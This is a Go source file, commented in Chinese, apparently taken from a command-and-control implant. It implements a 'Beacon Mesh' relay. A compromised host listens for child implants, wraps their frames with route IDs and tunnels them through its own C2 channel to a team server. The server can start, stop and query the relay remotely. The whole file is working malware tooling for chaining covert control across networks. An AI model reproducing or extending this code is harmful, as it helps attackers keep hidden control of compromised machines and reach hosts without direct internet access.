//go:build !light

package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// ─── 链式回连（Beacon Mesh）中继角色 ───
//
// 中继监听可来自两种途径：
//   1. 构建期配置 relayListen（非空时启动即监听）；
//   2. 运行时任务 relay（对已上线会话下发 start/stop 动态启停）。
//
// 中继在直连团队服务器的同时监听子植入体连接：
//   - 上行：读叶子帧（[4B len][1B type][data]），包装成 TypeRelay 帧（[4B routeID][子帧]）经自身 C2 连接转发；
//   - 下行：收到服务端下发的 TypeRelay 帧，解包后按 routeID 写回对应叶子连接。
//
// 叶子植入体无需任何特殊配置：其 server_addr 指向中继的监听地址即可。

var (
	relayMu       sync.RWMutex
	relayChildren = map[uint32]*relayChild{}
	relayNextID   uint32

	relayLnMu sync.Mutex
	relayLn   net.Listener
)

type relayChild struct {
	conn net.Conn
}

// startRelayListener 启动中继监听，返回错误信息（供任务结果回传）。
func startRelayListener(addr string) error {
	if addr == "" {
		return fmt.Errorf("empty relay listen addr")
	}
	relayLnMu.Lock()
	defer relayLnMu.Unlock()
	if relayLn != nil {
		return fmt.Errorf("relay already listening")
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen %s failed: %v", addr, err)
	}
	relayLn = ln
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go handleRelayChild(c)
		}
	}()
	reportRelayStatus(addr)
	return nil
}

// relayListeningAddr 返回当前中继监听地址；未监听时返回空串。
func relayListeningAddr() string {
	relayLnMu.Lock()
	defer relayLnMu.Unlock()
	if relayLn == nil {
		return ""
	}
	return relayLn.Addr().String()
}

// stopRelayListener 停止中继监听并关闭所有子连接。
func stopRelayListener() {
	relayLnMu.Lock()
	if relayLn != nil {
		relayLn.Close()
		relayLn = nil
	}
	relayLnMu.Unlock()

	relayMu.Lock()
	for id, child := range relayChildren {
		child.conn.Close()
		delete(relayChildren, id)
	}
	relayMu.Unlock()

	reportRelayStatus("")
}

// reportRelayStatus 上报中继监听状态到服务端（addr 为空表示已停止）。
func reportRelayStatus(addr string) {
	payload, _ := json.Marshal(map[string]string{"addr": addr})
	packet := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeRelayStatus,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	sendPacket(packet)
}

// handleRelayControl 运行时中继控制任务：{action:"start",addr} / {action:"stop"}。
func handleRelayControl(taskData string) (string, int32, string) {
	var req struct {
		Action string `json:"action"`
		Addr   string `json:"addr"`
	}
	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
		return "", -1, fmt.Sprintf("parse relay control failed: %v", err)
	}
	switch req.Action {
	case "start":
		if req.Addr == "" {
			return "", -1, "missing relay listen addr"
		}
		if err := startRelayListener(req.Addr); err != nil {
			return "", -1, err.Error()
		}
		return fmt.Sprintf("relay listener started on %s (now listening)", req.Addr), 0, ""
	case "stop":
		stopRelayListener()
		return "relay listener stopped", 0, ""
	case "status":
		if a := relayListeningAddr(); a != "" {
			return fmt.Sprintf("relay listening on %s", a), 0, ""
		}
		return "relay not listening", 0, ""
	default:
		return "", -1, fmt.Sprintf("unknown relay action: %q", req.Action)
	}
}

// handleRelayChild 处理单个叶子植入体连接：读帧 → 包装 → 上行。
func handleRelayChild(c net.Conn) {
	routeID := nextRouteID()
	registerRelayChild(routeID, c)
	defer func() {
		unregisterRelayChild(routeID)
		c.Close()
	}()

	var lenBuf [4]byte
	for {
		c.SetReadDeadline(time.Now().Add(2 * time.Minute))
		if _, err := io.ReadFull(c, lenBuf[:]); err != nil {
			return
		}
		length := binary.BigEndian.Uint32(lenBuf[:])
		if length == 0 || length > maxFrameSize {
			return
		}
		// 完整子帧 = 4B len + 1B type + data（长度字段沿用原值）
		frame := make([]byte, 5+length)
		binary.BigEndian.PutUint32(frame[:4], length)
		if _, err := io.ReadFull(c, frame[4:]); err != nil {
			return
		}
		sendRelayUp(routeID, frame)
	}
}

// sendRelayUp 将子帧包装成 TypeRelay 帧上行到团队服务器。
func sendRelayUp(routeID uint32, childFrame []byte) {
	payload := make([]byte, 4+len(childFrame))
	binary.BigEndian.PutUint32(payload[:4], routeID)
	copy(payload[4:], childFrame)

	packet := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeRelay,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	sendPacket(packet)
}

// handleRelayDown 处理服务端下发的 TypeRelay 帧：解包 → 写回对应叶子连接。
func handleRelayDown(payload []byte) {
	if len(payload) < 4 {
		return
	}
	routeID := binary.BigEndian.Uint32(payload[:4])
	childFrame := payload[4:]

	relayMu.RLock()
	child := relayChildren[routeID]
	relayMu.RUnlock()
	if child == nil {
		return
	}
	child.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, _ = child.conn.Write(childFrame)
}

func nextRouteID() uint32 {
	relayMu.Lock()
	defer relayMu.Unlock()
	relayNextID++
	if relayNextID == 0 {
		relayNextID = 1
	}
	return relayNextID
}

func registerRelayChild(id uint32, c net.Conn) {
	relayMu.Lock()
	relayChildren[id] = &relayChild{conn: c}
	relayMu.Unlock()
}

func unregisterRelayChild(id uint32) {
	relayMu.Lock()
	delete(relayChildren, id)
	relayMu.Unlock()
}
